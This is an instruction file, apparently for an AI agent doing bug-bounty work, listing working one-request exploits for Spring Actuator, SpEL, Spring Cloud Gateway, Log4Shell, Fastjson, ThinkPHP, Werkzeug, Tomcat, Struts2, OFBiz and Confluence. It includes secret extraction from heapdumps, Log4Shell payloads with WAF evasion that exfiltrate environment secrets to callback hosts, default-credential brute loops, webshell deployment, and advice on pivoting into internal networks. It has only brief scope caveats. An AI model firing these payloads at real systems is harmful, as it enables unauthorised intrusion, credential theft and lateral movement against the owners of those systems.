---
name: framework-1day-rce
description: Enterprise-framework 1-day RCE quick-wins — fingerprint → known CVE → single-request PoC for Spring Boot Actuator, Spring SpEL, Spring Cloud Gateway, Log4Shell, Fastjson/Jackson AutoType, ThinkPHP, Flask/Werkzeug debug console, Tomcat Manager, Struts2 OGNL, Apache OFBiz, and Confluence OGNL. Use the moment fingerprinting flags one of these stacks.
---

# Framework 1-Day RCE Quick-Wins

Enterprise frameworks ship known-CVE footguns. Recon fingerprints the stack — this file bridges fingerprint → exact detection request → exploit payload → severity, so a stack match becomes a fast Critical instead of a note. This is the highest signal-per-minute work available: a precise version fingerprint maps to a public CVE and the PoC is one request.

**Before you claim impact:** confirm the running version is in the vulnerable range AND land the working PoC (extracted secret, reflected command output, deployed shell, or OAST callback you control). A version banner alone is N/A — "looks vulnerable" is not a finding. Fingerprint via `Server` / `X-Application-Context` headers, error pages, `/META-INF/MANIFEST.MF`, `*.js.map`, or leaked `package.json` / `composer.json` / `pom.xml`.

## Routing Table

| Fingerprint signal | Section | Best case |
|---|---|---|
| `X-Application-Context`, `/actuator`, Whitelabel error page | Spring Boot Actuator | Critical (heapdump secrets / env RCE) |
| Spring app + reflected `#{...}` expression sink | Spring SpEL | Critical (RCE) |
| Spring Cloud Gateway + `/actuator/gateway` | Spring Cloud Gateway | Critical (RCE) |
| Any Java app logging user input (UA, headers) | Log4Shell | Critical (RCE) |
| Java API echoing JSON, `@type` accepted | Fastjson / Jackson AutoType | Critical (RCE) |
| `PHPSESSID` + `?s=` routing, `think\` in errors | ThinkPHP | Critical (RCE) |
| `Server: Werkzeug`, interactive traceback, `/console` | Flask / Werkzeug | Critical (RCE) |
| `Server: Apache-Coyote`, `/manager/html`, `JSESSIONID` | Tomcat Manager | Critical (RCE) |
| `.action`/`.do` URLs, `Struts` in stack trace | Struts2 OGNL | Critical (RCE) |
| `/control/main`, `OFBiz` in title/headers | Apache OFBiz | Critical (RCE) |
| `X-Confluence-Request-Time`, `/wiki`, Atlassian footer | Confluence OGNL | Critical (RCE) |

---

## Spring Boot Actuator (`/actuator/env`, `/heapdump`, `/gateway`)

**Fingerprint:** `X-Application-Context` header, Whitelabel Error Page, `/actuator` returns a JSON link index.

```bash
for p in env health info heapdump mappings configprops gateway threaddump beans; do
  for base in /actuator /; do
    curl -s -o /dev/null -w "%{http_code} ${base}${p}\n" "https://target.com${base}${p}"
  done
done
```

**Heapdump secret extraction (Critical, no auth):**
```bash
curl -s "https://target.com/actuator/heapdump" -o heap.hprof   # often 50-500MB
strings heap.hprof | grep -iE 'password|secret|aws_|api[_-]?key|jdbc:|authorization|bearer ' | sort -u
# Heap routinely holds DB creds, AWS keys, internal URLs, session tokens. Each live credential = its own finding.
```

**`/env` write → RCE (older Boot 1.x/2.x with POST allowed):**
```bash
curl -s "https://target.com/actuator/env" -X POST -H "Content-Type: application/json" \
  -d '{"name":"spring.cloud.bootstrap.location","value":"http://ATTACKER/x.yml"}'
curl -s "https://target.com/actuator/refresh" -X POST   # re-reads -> deserialization/SpEL -> RCE (eureka-client gadget)
```
**Submittable:** extracted live credential or proven RCE. **N/A:** `/actuator/health` alone, or `/env` with values masked `******`.

---

## Spring SpEL Injection

**Fingerprint:** a Spring app reflecting a parameter into an expression sink.

```bash
curl -s "https://target.com/path?x=%23%7B7*7%7D"   # #{7*7} -> 49 = TRUE SpEL (RCE-capable)
curl -s "https://target.com/path?x=%24%7B7*7%7D"   # ${7*7} -> 49 = property-placeholder reflection ONLY
```
> `${...}` is a trap: it is usually property-placeholder / error-page reflection that does **not** evaluate `T(...)`. Only a true SpEL sink (`#{...}` / `parseExpression()` on your input) runs the payloads below. Confirm with `#{7*7}` before burning time on `T()`.

```java
#{T(java.lang.Runtime).getRuntime().exec('id')}
#{T(java.lang.Runtime).getRuntime().exec(new String[]{"/bin/bash","-c","id"})}
#{T(java.net.InetAddress).getByName('OUTPUT.attacker.oast.site')}   // DNS-confirm when no output reflection
```
**Submittable:** reflected `id` output or an OAST hit via a `#{}` sink. **N/A:** `49` reflection alone.

---

## Spring Cloud Gateway — SpEL Injection (CVE-2022-22947)

**Fingerprint:** Spring Cloud Gateway 3.0.0–3.0.6 / 3.1.0 with the `gateway` actuator exposed (`/actuator/gateway/routes` → 200).

```bash
curl -s -X POST "https://target.com/actuator/gateway/routes/poc" \
  -H "Content-Type: application/json" -d '{
  "id":"poc","filters":[{"name":"AddResponseHeader","args":{
    "name":"Result",
    "value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
  }}],"uri":"http://example.com"}'
curl -s -X POST "https://target.com/actuator/gateway/refresh"
curl -si "https://target.com/actuator/gateway/routes/poc" | grep -i Result
curl -s -X DELETE "https://target.com/actuator/gateway/routes/poc"   # clean up
```

---

## Log4Shell — Log4j JNDI (CVE-2021-44228)

**Fingerprint:** any Java app logging user input (User-Agent, `X-Api-Version`, `Referer`, username/search fields). No version banner needed — spray the marker, watch for a callback.

```bash
PAYLOAD='${jndi:ldap://${hostName}.OAST_ID.oast.site/a}'   # ${hostName} tags which host fired
curl -s "https://target.com/" -H "User-Agent: $PAYLOAD" -H "X-Api-Version: $PAYLOAD" -H "Referer: $PAYLOAD"
# WAF-evasion: ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://x.oast.site/a}
# DNS-only reachability: ${jndi:dns://x.oast.site/a}
```
**Submittable:** OAST hit you control (add `${env:AWS_SECRET_ACCESS_KEY}` to exfil). DNS-only = Medium; LDAP-gadget RCE = Critical. **N/A:** no callback.

---

## Fastjson / Jackson AutoType (JNDI Deserialization)

**Fingerprint:** Java API parsing a JSON body; an extra `@type` key changes behavior or errors `autoType is not support`.

```bash
curl -s "https://target.com/api/x" -H "Content-Type: application/json" -d '{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://OAST_ID.oast.site/a", "autoCommit":true }'
# OAST DNS hit = AutoType reachable. Then point dataSourceName at a rogue JNDI (JNDIExploit.jar / rogue-jndi).
```
Post-JDK-8u191 the JNDI ref must use a local-classpath gadget (BeanFactory/ELProcessor). **N/A:** `autoType is not support`.

---

## ThinkPHP 5.x RCE (`invokefunction`)

**Fingerprint:** PHP, `?s=` routing, `think\` in errors, `PHPSESSID`. Affected: 5.0.5–5.0.22, 5.1.x < 5.1.31.

```bash
curl -s "https://target.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" | grep -i 'php version'
curl -s "https://target.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
# 5.1.x: curl -s "https://target.com/?s=index/\think\Request/input&filter[]=system&data=id"
```
**Submittable:** reflected `id`/`phpinfo()` output.

---

## Flask / Werkzeug Debug Console

**Fingerprint:** `Server: Werkzeug`, interactive traceback page, or `/console` PIN prompt → `debug=True` in prod.

```bash
curl -s "https://target.com/console" | grep -i 'pin\|werkzeug\|interactive'
```
With an LFI/path-traversal primitive, read the 6 PIN ingredients (`/etc/passwd` username, modname `flask.app`, appname `Flask`, app.py path from the traceback, `/sys/class/net/eth0/address` MAC as decimal, `/etc/machine-id`), reproduce the PIN offline via the public Werkzeug algorithm, then run `__import__('os').popen('id').read()` in the console. **Submittable:** console code execution (debug=True + interactive traceback alone is already a reportable source/env leak).

---

## Tomcat Manager — Weak Creds → WAR Deploy / PUT Write

**Fingerprint:** `Server: Apache-Coyote/1.1`, `JSESSIONID`, `/manager/html` Basic-Auth prompt.

```bash
for cred in tomcat:tomcat admin:admin tomcat:s3cret manager:manager tomcat:admin; do
  curl -s -o /dev/null -w "$cred -> %{http_code}\n" -u "$cred" "https://target.com/manager/text/list"
done
# Deploy a JSP webshell WAR:
curl -s -u USER:PASS -T shell.war "https://target.com/manager/text/deploy?path=/poc&update=true"
curl -s "https://target.com/poc/shell.jsp?cmd=id"
# PUT JSP write (CVE-2017-12615, readonly=false):
curl -s -X PUT "https://target.com/poc.jsp/" --data-binary @shell.jsp   # trailing slash bypasses the block
curl -s "https://target.com/poc.jsp?cmd=id"
```

---

## Struts2 OGNL (S2-045, CVE-2017-5638)

**Fingerprint:** `.action`/`.do` URLs, `Struts` in stack traces. S2-045 rides a malicious `Content-Type`.

```bash
curl -s -D - "https://target.com/index.action" \
  -H "Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#ct.setMemberAccess(#dm)).(#cmd='id').(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/bash','-c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```
**N/A:** no output — often WAF virtual-patched (a 403 here is usually the WAF, not the fix).

---

## Apache OFBiz — Unauth RCE (CVE-2023-49070 / CVE-2024-45195)

**Fingerprint:** `/control/main`, `OFBiz` in title/headers. Affected: < 18.12.10 (XML-RPC chain), < 18.12.16 (view-auth bypass).

```bash
curl -sk "https://target.com/webtools/control/ViewBlogArticle?USERNAME=&PASSWORD=&requirePasswordChange=Y" -o /dev/null -w "%{http_code}\n"
curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/webtools/control/xmlrpc"
```
The empty-creds / `requirePasswordChange=Y` override reaches a screen rendering a Groovy program; chain to `ProgramExport`/XML-RPC deserialization (public PoCs: jakabakos/Apache-OFBiz-Authentication-Bypass), confirm with OAST/reflected output.

---

## Confluence / Atlassian OGNL (CVE-2022-26134)

**Fingerprint:** `X-Confluence-Request-Time` header, `/wiki` base, Atlassian footer. Pre-auth OGNL in the URL namespace.

```bash
curl -sk -D - -o /dev/null "https://target.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
# A populated X-Cmd-Response header = confirmed unauthenticated RCE.
```
Affected: all supported versions < 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1. Many Confluence instances are vendor-hosted — verify scope/asset ownership before firing.

---

> **Chain note:** these escalate — Spring heapdump → AWS keys → pivot via SSRF/cloud-metadata; Tomcat/Confluence/OFBiz shell → internal network → SSRF and IDOR on adjacent services. Pull the secret or land the shell first, then map what it unlocks before writing the report.
